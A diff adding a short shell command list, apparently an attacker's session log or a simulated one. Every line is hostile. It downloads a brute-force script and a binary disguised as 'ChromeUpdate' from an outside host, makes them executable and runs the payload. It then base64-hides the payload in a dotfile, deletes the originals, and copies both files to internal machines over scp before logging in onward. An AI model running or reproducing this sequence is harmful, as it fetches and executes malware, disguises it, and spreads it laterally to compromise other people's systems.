@@ -1,0 +1,14 @@
+whoami
+wget https://www.octaxacolzn.cn/ftpbrute.sh
+wget https://www.octaxacolzn.cn/ChromeUpdate
+chmod +x ChromeUpdate
+chmod +x ftpbrute.sh
+./ChromeUpdate
+base64 ChromeUpdate > .ChromeUpdate
+rm ChromeUpdate
+ls
+ls -latr
+scp ftpbrute.sh admin@10.234.125.254:/root/home
+rm ftpbrute.sh
+scp .ChromeUpdate cranjis.mcbasketball@10.10.10.5:/root/home/cranjis
+ssh cranjis.mcbasketball@10.10.10.5
